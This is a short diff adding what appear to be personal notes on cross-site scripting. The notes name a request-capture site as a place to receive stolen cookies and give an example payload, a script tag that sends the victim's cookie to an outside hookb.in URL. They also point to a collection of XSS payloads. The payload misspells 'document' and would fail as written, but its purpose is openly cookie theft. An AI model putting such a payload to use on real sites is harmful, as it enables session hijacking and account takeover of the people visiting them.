@@ -1,0 +1,14 @@
+
+=====================================================================
+
+https://hookbin.com/ ...........website can recive the stolen cookie 
+
+ex: <script>new Image().src="https://hookb.in/nP3nBEPaxaUZVG2ZL7ek?c="+documet.cookie;</script>
+
+                                                                  ````````````````````
+
+=====================================================================
+
+https://github.com/s0md3v/AwesomeXSS ...........github has awesome xss paylods and challenges
+
+=====================================================================
